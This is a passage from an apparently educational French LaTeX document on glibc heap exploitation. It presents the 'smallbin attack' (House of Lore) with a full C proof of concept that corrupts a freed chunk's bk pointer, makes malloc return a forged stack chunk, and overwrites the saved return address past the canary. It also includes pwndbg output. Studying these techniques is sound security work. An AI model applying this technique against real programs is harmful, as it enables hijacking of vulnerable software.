\subsubsection{Smallbin Attack}

\noindent\textbf{Fichier de Référence :}
\href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/house_of_lore.c}{\texttt{house\_of\_lore.c}}

\noindent\textbf{Techniques similaires :}
\href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/unsafe_unlink.c}{\texttt{unsafe\_unlink.c}},
\href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/overlapping_chunks.c}{\texttt{overlapping\_chunks.c}}

\noindent\textbf{Hypothèse :} small bin, use-after-free, corruption de pointeurs.

\noindent\textbf{Inconvénient :} on ne peut modifier la cible qu’avec des valeurs d’adresse.

Le principe de cette technique consiste à forger un faux chunk situé en dehors de la heap
(ici sur la pile) et à corrompre les pointeurs \texttt{fd} et \texttt{bk} d’un chunk
smallbin afin de forcer \texttt{malloc()} à retourner ce chunk forgé.


\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
void jackpot()
{
    fprintf(stderr, "I'm the boss\n");
    exit(0);
}

int main()
{
       intptr_t *stack_buffer_1[4] = {0};
       intptr_t *stack_buffer_2[4] = {0};
       void *fake_freelist[7][4];

       intptr_t *victim = malloc(0x100);

       void *dummies[7];
       for (int i = 0; i < 7; i++)
              dummies[i] = malloc(0x100);

       intptr_t *victim_chunk = victim - 2;

       for (int i = 0; i < 6; i++)
       {
              fake_freelist[i][3] = fake_freelist[i + 1];
       }
       fake_freelist[6][3] = NULL;

       stack_buffer_1[0] = 0;
       stack_buffer_1[1] = 0;
       stack_buffer_1[2] = victim_chunk;

       stack_buffer_1[3] = (intptr_t *)stack_buffer_2;
       stack_buffer_2[2] = (intptr_t *)stack_buffer_1;

       stack_buffer_2[3] = (intptr_t *)fake_freelist[0];

       void *p5 = malloc(1000);

       for (int i = 0; i < 7; i++)
              free(dummies[i]);
       free((void *)victim);

       void *p2 = malloc(1200);

       //------------VULNERABILITY-----------

       victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

       //------------------------------------
       for (int i = 0; i < 7; i++)
              malloc(0x100);

       void *p3 = malloc(0x100);

       char *p4 = malloc(0x100);

       intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode

        long truc = (long)__builtin_frame_address(0);
       long offset = (long)__builtin_frame_address(0) - (long)p4;

       // This bypasses stack-smash detection since it jumps over the canary
       memcpy((p4 + offset + 8), &sc, 8);

       // sanity check
       assert((long)__builtin_return_address(0) == (long)jackpot);
}
\end{minted}


Cette démonstration se fait en deux parties.

La première consiste à construire un faux chunk sur la pile sans déclencher d'erreur ;
la seconde porte sur la redirection du flux d'exécution.

\textbf{Chunk dans la stack :}

Le chunk que nous allons créer appartient à la catégorie des smallbins.
L’objectif est de corrompre la liste doublement chaînée du smallbin afin
de la faire pointer vers un chunk contrôlé.

Pour cela, nous préparons deux chunks, \texttt{stack\_buffer\_1} (notre chunk
fabriqué) et \texttt{stack\_buffer\_2} (cohérence), ainsi que la liste
\texttt{fake\_freelist}, qui permettent de préserver la cohérence interne
de la structure des smallbins.

Pour pouvoir manipuler un chunk dans le smallbin, il faut d’abord saturer
le tcache. Le chunk qui nous servira de point d’entrée dans le smallbin est
\texttt{victim}, plus précisément \texttt{victim\_chunk}, qui commence au
niveau des métadonnées de \texttt{victim}.

Une fois nos huit chunks alloués et la liste chaînée préparée, nous
construisons notre faux chunk en plaçant son champ \texttt{fd} sur
\texttt{victim\_chunk}. L’idée est de faire en sorte que \texttt{stack\_buffer}
soit inséré juste après \texttt{victim\_chunk} dans le smallbin. Son champ
\texttt{bk} est quant à lui orienté vers notre second faux chunk.

Pour maintenir la cohérence de la structure, nous faisons ensuite pointer
le champ \texttt{fd} de \texttt{stack\_buffer\_2} vers \texttt{stack\_buffer\_1},
et son champ \texttt{bk} vers notre liste chaînée.

Une fois ces préparatifs terminés, nous plaçons un gardien destiné à
empêcher la consolidation avec le top chunk.\\
Pour finaliser l’opération, nous insérons \texttt{victim} dans le smallbin
en libérant les chunks qui saturent le tcache, puis en libérant notre chunk
\texttt{victim} afin qu’il soit rangé dans le smallbin.

C’est à ce moment que notre corruption du smallbin intervient, nous
modifions le champ \texttt{bk} pour qu’il pointe vers notre faux chunk.
Nous obtenons alors :



\[
       \text{fd : } \text{victim} \;\rightarrow\; \text{stack\_buffer\_1} \;\rightarrow\;
       \text{stack\_buffer\_2} \;\rightarrow\; \text{fake\_freelist}
\]





\[
       \text{bk : } \text{victim} \;\leftarrow\; \text{stack\_buffer\_1} \;\leftarrow\;
       \text{stack\_buffer\_2} \;\leftarrow\; \text{fake\_freelist}
\]



Il ne reste plus qu’à récupérer tous les chunks présents dans le tcache et
dans le smallbin pour compléter la technique.



\textbf{Redirection du programme :}

Pour rediriger le programme, on fait un calcul relatif depuis le chunk contrôlé (p4)
pour écraser la valeur du saved RIP dans la stack et ainsi faire diverger le flux
d'exécution.


La fonction \texttt{\_\_builtin\_frame\_address(0)} retourne l’adresse du registre
\texttt{rbp}, qui correspond au début de la frame courante.

\begin{pwndbg}[heap]{text}
       pwndbg> p \$rbp
       \$8 = (void *) 0x7fffffffd840
       pwndbg> p p4
       \$9 = 0x7fffffffd7e0 "=("
       pwndbg> p 0x7fffffffd840 - 0x7fffffffd7e0
       \$10 = 96
       pwndbg> p offset
       \$11 = 96
\end{pwndbg}
